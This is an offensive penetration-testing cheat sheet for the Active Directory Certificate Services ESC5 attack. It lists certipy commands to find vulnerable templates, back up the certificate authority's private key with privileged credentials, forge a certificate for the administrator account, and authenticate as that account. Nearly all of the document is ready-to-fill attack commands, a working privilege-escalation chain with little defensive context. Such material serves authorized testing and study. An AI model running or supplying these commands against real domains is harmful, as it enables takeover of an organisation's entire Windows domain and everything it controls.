# ADCS ESC5 (Use Powershell/Powerview to modify AD-Objects)

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
### When inspecting, look for permissions allowing non-administrative users, 
### or overly broad groups (like "Authenticated Users" or "Domain Users"), to modify these objects or their critical attributes (e.g., WriteProperty on certificateThumbprint for an object in AIA, 
### or WriteProperty on msPKI-Certificates for the NTAuthCertificates store).
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Dump CA Key
### These steps assume the CA's private key has already been compromised and exported to a .pfx file, potentially as an outcome of an advanced ESC5 attack or another CA compromise method like ESC7 or stealing a backup
```
certipy ca \
    -u '<privileged_username>'@<domain>' -p '<password>' \
    -ns '<NS_SERVER>' -target '<CA_FQDN>' \
    -config '<CA_FQDN>\<CA_CONFIG_STRING>' -backup
```

## 3. Forge Golden Ticket
```
certipy forge \
    -ca-pfx '<CA_PFX>.pfx' -upn 'administrator@<domain>' \
    -sid '<ADMIN_SID>' -crl 'ldap:///'
```

## 4. Authenticate
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
